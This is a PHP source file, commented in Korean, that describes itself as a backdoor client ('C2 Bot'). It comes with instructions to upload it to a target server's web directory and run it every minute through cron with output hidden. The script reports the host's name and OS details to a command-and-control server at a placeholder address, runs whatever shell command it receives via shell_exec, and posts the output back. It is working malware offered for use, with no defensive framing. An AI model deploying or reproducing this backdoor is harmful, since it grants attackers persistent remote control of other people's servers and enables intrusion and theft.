<?php
/**
 * C2 Bot (백도어 클라이언트)
 * 주기적으로 C2 서버에 접속하여 명령을 받아 실행
 *
 * 사용법:
 * 1. 타겟 서버의 웹 디렉토리에 업로드
 * 2. Cron으로 주기적 실행:
 *    * * * * * php /path/to/c2_bot.php > /dev/null 2>&1
 */

// ====== 설정 ======
$C2_SERVER = 'http://YOUR_C2_IP:8080';  // C2 서버 주소 (변경 필요!)
$BOT_ID = md5(gethostname() . php_uname());  // 고유 봇 ID
$CHECK_INTERVAL = 60;  // 체크인 간격 (초)

// ====== 함수 ======

// C2 서버에 체크인
function checkin($c2_server, $bot_id) {
    $data = array(
        'bot_id' => $bot_id,
        'hostname' => gethostname(),
        'os_info' => php_uname()
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data),
            'timeout' => 10
        )
    );

    $context = stream_context_create($options);
    $response = @file_get_contents($c2_server . '/checkin', false, $context);

    if ($response === FALSE) {
        return null;
    }

    return json_decode($response, true);
}

// 명령 실행
function execute_command($command) {
    $output = shell_exec($command . ' 2>&1');
    return $output ? $output : '[No output]';
}

// 결과 전송
function send_result($c2_server, $bot_id, $command_id, $result) {
    $data = array(
        'bot_id' => $bot_id,
        'command_id' => $command_id,
        'result' => $result
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data),
            'timeout' => 10
        )
    );

    $context = stream_context_create($options);
    @file_get_contents($c2_server . '/result', false, $context);
}

// ====== 메인 로직 ======

// 체크인
$response = checkin($C2_SERVER, $BOT_ID);

if ($response && $response['status'] === 'ok') {
    if (isset($response['command']) && $response['command'] !== null) {
        // 명령 받음
        $command = $response['command'];
        $command_id = $response['command_id'];

        // 명령 실행
        $result = execute_command($command);

        // 결과 전송
        send_result($C2_SERVER, $BOT_ID, $command_id, $result);
    }
}

// 정상 종료
exit(0);
?>
